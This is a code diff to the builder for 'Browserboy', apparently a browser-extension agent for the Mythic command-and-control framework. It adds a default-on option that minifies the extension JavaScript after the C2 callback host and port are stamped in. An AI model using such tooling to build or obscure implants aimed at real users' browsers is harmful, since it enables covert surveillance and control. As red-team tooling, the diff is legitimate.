@@ -6,6 +6,7 @@ from mythic_container.PayloadBuilder import *
 
 from .packaging import (
     KNOWN_COMMANDS,
+    _as_bool,
     aespsk_mode,
     build_agent_config,
     stamp_extension,
@@ -62,6 +63,12 @@ class Browserboy(PayloadType):
             description="update_url in the manifest",
             default_value="https://example.com/update.xml",
         ),
+        BuildParameter(
+            name="minify",
+            parameter_type=BuildParameterType.Boolean,
+            description="Minify extension JavaScript after stamping. Leave on for payloads.",
+            default_value=True,
+        ),
     ]
     agent_path = pathlib.Path(".") / "browserboy"
     agent_icon_path = agent_path / "agent_functions" / "browserboy.svg"
@@ -70,6 +77,7 @@ class Browserboy(PayloadType):
         BuildStep(step_name="Gathering Files", step_description="Copy extension sources"),
         BuildStep(step_name="Validating C2", step_description="Require HTTP with AESPSK=none"),
         BuildStep(step_name="Stamping", step_description="Write config, manifest, and command registry"),
+        BuildStep(step_name="Minifying", step_description="Minify stamped JavaScript with rjsmin"),
         BuildStep(step_name="Packaging", step_description="Zip the unpacked extension"),
     ]
 
@@ -145,6 +153,7 @@ class Browserboy(PayloadType):
                 "update_url": self.get_parameter("update_url"),
             }
 
+            minify = _as_bool(self.get_parameter("minify"))
             with tempfile.TemporaryDirectory(prefix="browserboy-") as tmp:
                 dest = pathlib.Path(tmp) / "extension"
                 stamp_extension(
@@ -153,8 +162,14 @@ class Browserboy(PayloadType):
                     config=config,
                     manifest_fields=manifest_fields,
                     command_names=selected,
+                    minify=minify,
                 )
                 await self._step("Stamping", True, f"host={config['callback_host']}:{config['callback_port']}")
+                await self._step(
+                    "Minifying",
+                    True,
+                    "rjsmin applied" if minify else "minify disabled",
+                )
 
                 zip_path = pathlib.Path(tmp) / "browserboy.zip"
                 zip_extension(dest, zip_path)
